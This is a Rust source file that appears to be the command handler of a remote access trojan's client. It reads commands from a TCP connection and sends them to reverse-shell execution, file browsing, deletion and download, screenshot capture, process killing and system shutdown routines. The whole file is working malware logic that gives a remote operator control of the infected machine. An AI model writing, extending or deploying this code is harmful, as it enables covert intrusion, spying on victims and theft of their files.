use std::io::{Read, Write};
use std::sync::{Arc, Mutex};
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Child;

use crate::features::reverse_shell::{start_shell, exit_shell, execute_shell_command};
use crate::features::file_manager::file_manager;
use crate::features::system_commands::system_commands;
use crate::features::other::{take_screenshot, client_info};
use crate::features::process::{process_list, kill_process};

pub fn handle_command(write_stream: &mut TcpStream, command: &str, remote_shell: &mut Option<Child>, current_path: &mut PathBuf) {
    match command {
        cmd 
        if cmd.starts_with("view_dir||") || cmd.starts_with("remove_dir||") || cmd.starts_with("remove_file||") || cmd.starts_with("download_file||") => {
            file_manager(write_stream, current_path, cmd);
        },
        "available_disks" | "previous_dir" => {
            file_manager(write_stream, current_path, command);
        },
        "init_client" => client_info(write_stream),
        _ if command.starts_with("take_screenshot") => {
            let display = command["take_screenshot::".len()..].parse::<i32>().unwrap();
            take_screenshot(write_stream, display);
        },
        "process_list" => process_list(write_stream),
        _ if command.starts_with("kill_process") => {
            let pid = command["kill_process::".len()..].parse::<usize>().unwrap();
            kill_process(pid);
        },
        "start_shell" => {
            let shared_stream = Arc::new(Mutex::new(write_stream.try_clone().expect("Failed to clone TcpStream")));
            start_shell(shared_stream, remote_shell)
        },
        "exit_shell" => exit_shell(remote_shell),
        _ if command.starts_with("shell::") => execute_shell_command(remote_shell, &command["shell::".len()..]),
        "shutdown" | "logout" | "restart" => system_commands(command),
        _ => {}
    }
}

pub fn read_buffer_tcp(stream: &mut TcpStream) -> std::io::Result<Vec<u8>> {
    // Read the size of the incoming message as a 4-byte array
    let mut size_bytes = [0_u8; 4];
    stream.read_exact(&mut size_bytes)?;

    // Convert the byte array to usize
    let size = u32::from_be_bytes(size_bytes) as usize;

    // Allocate buffer of the exact size needed
    let mut buffer = vec![0_u8; size];
    stream.read_exact(&mut buffer)?;

    Ok(buffer)
}

pub fn write_bytes(stream: &mut TcpStream, bytes: &[u8]) {
    // Convert the message to bytes and calculate its length
    let size = bytes.len() as u32;
    let size_bytes = size.to_be_bytes();

    // Send the size of the message first
    let _ = stream.write_all(&size_bytes);

    // Send the actual message data
    let _ = stream.write_all(bytes);
}

pub fn read_buffer<I>(stream: &mut I) -> Result<Vec<u8>, ()>
    where I: Read {
    let mut buffer = [0_u8; 1024]; // 1MB Buffer
    match stream.read(&mut buffer) {
        Ok(size) => {
            if size == 0 {
                return Err(());
            }

            let mut vect: Vec<u8> = Vec::new();
            for v in &buffer[0..size] {
                vect.push(*v);
            }

            Ok(vect)
        },
        Err(_) => {
            Err(())
        }
    }
}